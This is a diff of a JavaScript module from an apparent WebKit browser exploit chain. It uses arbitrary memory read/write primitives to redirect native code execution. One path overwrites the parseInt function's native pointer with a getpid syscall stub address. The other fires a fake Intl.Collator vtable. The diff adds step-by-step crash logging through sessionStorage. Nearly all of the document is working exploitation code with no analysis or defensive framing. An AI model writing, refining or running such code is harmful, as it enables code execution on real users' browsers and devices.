@@ -1,10 +1,5 @@
 /**
- * Novel native entry — NO G0-G5 slab, NO expm1 ROP pivot chain.
- *
- * Path A: stub-swap — write lk+getpid stub into parseInt m_function, call parseInt(ta), restore.
- * Path B: collator-stub — fake Intl.Collator vtable → lk+getpid stub, one compare() fire.
- *
- * Uses slopkit-core primitive + carrier.textarea @ READ-PRIMITIVE-PASS.
+ * Direct stub entry — NO G0-G5 slab. Step logs + flush before each dangerous op.
  */
 import { int64 } from "./int64.js";
 
@@ -13,6 +8,7 @@ const ARENA_BYTES = 0x1000;
 const FAKE_UC = 0x100;
 const FAKE_VT = 0x300;
 const MARK_OFF = 0xf00;
+const SS_LAST = "wk-stub-last-step";
 
 function codeLooksNative(code4) {
     return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
@@ -41,65 +37,113 @@ function putLow48(view, off, ptr) {
     view[off + 7] = 0;
 }
 
-/** parseInt JSFunction → NativeExecutable m_function slot (same walk as poops, zero slab). */
-export function captureParseIntMainMf(p, off) {
+function stubCtx(opts) {
+    const log = opts && opts.log ? opts.log : function () { };
+    const flush = opts && opts.flush ? opts.flush : function () { };
+    function step(tag, detail) {
+        log(tag, detail);
+        try { sessionStorage.setItem(SS_LAST, tag + (detail ? " " + detail : "")); } catch (_) { }
+        flush();
+    }
+    return { step, log, flush };
+}
+
+export function captureParseIntMainMf(p, off, opts) {
+    const { step } = stubCtx(opts || {});
+    if (!p || typeof p.leakval !== "function")
+        throw new Error("stub: no primitive p");
+    if (!off) throw new Error("stub: no offset table (wrong UA?)");
     const mOff = off.wk_JSFunction_m_function || 0x28;
+    step("STUB-CAP1", "leakval parseInt");
     const cell = p.leakval(parseInt);
+    step("STUB-CAP2", "cell=" + cell);
     const jfn = p.read8(cell.add32(0x18));
     if (!jfn) throw new Error("stub: no exec @ parseInt+0x18");
     const mainMf = jfn.add32(mOff);
     const mainOrig = p.read8(mainMf);
-    if (!mainOrig) throw new Error("stub: mainOrig read failed");
+    if (!mainOrig) throw new Error("stub: mainOrig read failed @ " + mainMf);
     const probe = read4p(p, mainOrig);
+    step("STUB-CAP3", "mainMf=" + mainMf + " orig=" + mainOrig + " probe=0x"
+        + (probe != null ? probe.toString(16) : "null"));
     if (!codeLooksNative(probe))
-        throw new Error("stub: mainOrig not code probe=0x" + (probe != null ? probe.toString(16) : "null"));
+        throw new Error("stub: mainOrig not code");
     return { cell, jfn, mainMf, mainOrig, nativeFn: mainOrig };
 }
 
 export function resolveGetpidStub(lk, off, prefer) {
     if (!lk || !off) throw new Error("stub: need lk+off");
-    if (prefer === "syscall" && off.k_getpid_syscall != null)
-        return { addr: lk.add32(off.k_getpid_syscall), tag: "lk+0x" + off.k_getpid_syscall.toString(16) + " (syscall)" };
-    if (off.k_stubs && off.k_stubs[20] != null)
-        return { addr: lk.add32(off.k_stubs[20]), tag: "lk+stub20 0x" + off.k_stubs[20].toString(16) };
-    if (off.k_getpid_syscall != null)
-        return { addr: lk.add32(off.k_getpid_syscall), tag: "lk+0x" + off.k_getpid_syscall.toString(16) };
-    throw new Error("stub: no getpid offset in table");
+    const kinds = [];
+    if (prefer === "syscall" || prefer === "all")
+        kinds.push("syscall");
+    if (prefer === "stub20" || prefer === "all" || !prefer)
+        kinds.push("stub20");
+    if (prefer === "syscall") { /* done */ }
+    else if (prefer !== "stub20" && off.k_getpid_syscall != null)
+        kinds.push("syscall");
+    const out = [];
+    if (kinds.indexOf("stub20") >= 0 && off.k_stubs && off.k_stubs[20] != null)
+        out.push({ addr: lk.add32(off.k_stubs[20]), tag: "stub20+0x" + off.k_stubs[20].toString(16) });
+    if (kinds.indexOf("syscall") >= 0 && off.k_getpid_syscall != null)
+        out.push({ addr: lk.add32(off.k_getpid_syscall), tag: "syscall+0x" + off.k_getpid_syscall.toString(16) });
+    if (!out.length) throw new Error("stub: no getpid offset");
+    return out;
 }
 
-/**
- * Path A — direct m_function stub swap. No gadgets, no pivot hook, no ArrayBuffer slab.
- * Returns JS-visible result from parseInt (may not equal pid — survival = win for bisect).
- */
 export function fireStubSwapParseInt(p, off, lk, opts) {
     opts = opts || {};
+    const { step } = stubCtx(opts);
     const carrier = opts.carrier || (typeof window !== "undefined" ? window._wkCarrier : null);
-    const cap = captureParseIntMainMf(p, off);
-    const stub = resolveGetpidStub(lk, off, opts.stubKind);
-    const trigger = parseInt;
-    let fireArg;
-    if (opts.arg !== undefined) fireArg = opts.arg;
-    else if (carrier && carrier.textarea) fireArg = carrier.textarea;
-    else fireArg = 1;
+    const cap = captureParseIntMainMf(p, off, opts);
+    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "all");
+    const stub = stubs[opts.stubIdx != null ? opts.stubIdx : 0];
 
+    let fireArg;
+    let argLabel;
+    if (opts.arg !== undefined) {
+        fireArg = opts.arg;
+        argLabel = "custom";
+    } else if (opts.useTextarea !== false && carrier && carrier.textarea) {
+        fireArg = carrier.textarea;
+        argLabel = "textarea";
+    } else {
+        fireArg = 1;
+        argLabel = "literal-1";
+    }
+
+    step("STUB-ARM", "write " + stub.tag + " → mainMf=" + cap.mainMf);
     p.write8(cap.mainMf, stub.addr);
+    const armed = p.read8(cap.mainMf);
+    step("STUB-ARM-CHK", "got=" + armed + " want=" + stub.addr);
+    if (!armed || String(armed) !== String(stub.addr))
+        throw new Error("stub: arm write did not stick");
+
+    if (opts.armOnly)
+        return { path: "stub-arm-only", stub: stub.addr, stubTag: stub.tag, mainMf: cap.mainMf, armed: true };
+
+    step("STUB-FIRE", "parseInt(" + argLabel + ") — OOM/crash past here = entered stub");
     let result = NaN;
     let err = null;
     try {
-        result = trigger(fireArg);
+        result = parseInt(fireArg);
     } catch (e) {
         err = e;
     } finally {
-        try { p.write8(cap.mainMf, cap.mainOrig); } catch (_) { }
+        try {
+            p.write8(cap.mainMf, cap.mainOrig);
+            step("STUB-RESTORE", "mainMf restored");
+        } catch (re) {
+            step("STUB-RESTORE-FAIL", re.message || String(re));
+        }
     }
     if (err) throw err;
+    step("STUB-DONE", "jsResult=" + result);
     return {
         path: "stub-swap-parseInt",
         stub: stub.addr,
         stubTag: stub.tag,
         mainMf: cap.mainMf,
         mainOrig: cap.mainOrig,
-        fireArg: fireArg === carrier && carrier && carrier.textarea ? "textarea" : fireArg,
+        fireArg: argLabel,
         result,
     };
 }
@@ -112,9 +156,6 @@ function arenaBacking(p, view) {
     return ptr;
 }
 
-/**
- * Path B — Collator compare enters fake vtable → getpid stub directly (no gd trampoline, no ROP).
- */
 export function pinCollatorStub(retain) {
     retain = retain || [];
     const collator = new Intl.Collator("en", { usage: "search" });
@@ -128,15 +169,12 @@ export function pinCollatorStub(retain) {
     view[MARK_OFF + 3] = 0x31;
     const compareArg = "\x00";
     retain.push(collator, compareFn, ab, view, compareArg);
-    const collCell = p => p.leakval(collator);
     return {
         collator,
         compareFn,
         compareArg,
         view,
         ab,
-        collCell,
-        arenaBacking: function (p) { return arenaBacking(p, view); },
         buildFake: function (p) {
             const backing = arenaBacking(p, view);
             if (!backing) throw new Error("collator stub: arena fail");
@@ -157,15 +195,20 @@ export function pinCollatorStub(retain) {
 
 export function fireCollatorStub(p, pin, lk, off, opts) {
     opts = opts || {};
+    const { step } = stubCtx(opts);
     if (!pin || !pin.compareFn) throw new Error("collator stub: pin first");
-    const stub = resolveGetpidStub(lk, off, opts.stubKind);
+    const stubs = resolveGetpidStub(lk, off, opts.stubKind || "all");
+    const stub = stubs[0];
+    step("STUB-COL1", "build fake");
     const fake = pin.buildFake(p);
     putLow48(pin.view, FAKE_VT + 0x128, stub.addr);
     putLow48(pin.view, FAKE_UC + 0xe0, stub.addr);
+    step("STUB-COL2", "prewarm compare");
     const pre = pin.compareFn(pin.compareArg, "b");
-    if (!Number.isFinite(pre)) throw new Error("collator stub: prewarm fail pre=" + pre);
+    if (!Number.isFinite(pre)) throw new Error("collator prewarm fail pre=" + pre);
     const orig = p.read8(fake.field);
     p.write8(fake.field, fake.fakeUC);
+    step("STUB-COL-FIRE", stub.tag + " — crash past here = entered stub");
     let result = NaN;
     let err = null;
     try {
@@ -176,6 +219,7 @@ export function fireCollatorStub(p, pin, lk, off, opts) {
         try { p.write8(fake.field, orig); } catch (_) { }
     }
     if (err) throw err;
+    step("STUB-COL-DONE", "result=" + result);
     return {
         path: "collator-stub-direct",
         stub: stub.addr,
@@ -186,13 +230,8 @@ export function fireCollatorStub(p, pin, lk, off, opts) {
     };
 }
 
-/** Bisect: arm stub only, no fire — verify write sticks on mainMf. */
 export function verifyStubSwapArm(p, off, lk, opts) {
-    const cap = captureParseIntMainMf(p, off);
-    const stub = resolveGetpidStub(lk, off, opts && opts.stubKind);
-    p.write8(cap.mainMf, stub.addr);
-    const got = p.read8(cap.mainMf);
-    p.write8(cap.mainMf, cap.mainOrig);
-    const ok = got && String(got) === String(stub.addr);
-    return { ok, mainMf: cap.mainMf, want: stub.addr, got, mainOrig: cap.mainOrig };
+    return fireStubSwapParseInt(p, off, lk, Object.assign({}, opts || {}, { armOnly: true }));
 }
+
+export { SS_LAST as STUB_LAST_STEP_KEY };
